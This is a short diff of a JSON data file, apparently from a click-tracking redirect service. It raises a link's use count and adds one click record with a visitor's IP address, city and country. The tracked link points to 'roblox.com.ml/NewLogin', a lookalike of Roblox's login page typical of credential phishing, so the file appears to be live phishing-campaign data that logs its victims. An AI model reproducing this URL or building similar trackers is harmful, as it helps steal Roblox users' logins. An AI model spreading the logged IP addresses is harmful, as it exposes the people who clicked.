@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 536,
+    "useCount": 537,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4400,6 +4400,14 @@
         "city": "Guayaquil",
         "flag": "🇪🇨",
         "countryCode": "EC"
+      },
+      {
+        "timestamp": 1777092919033,
+        "ip": "42.113.59.12",
+        "country": "Vietnam",
+        "city": "Hanoi",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
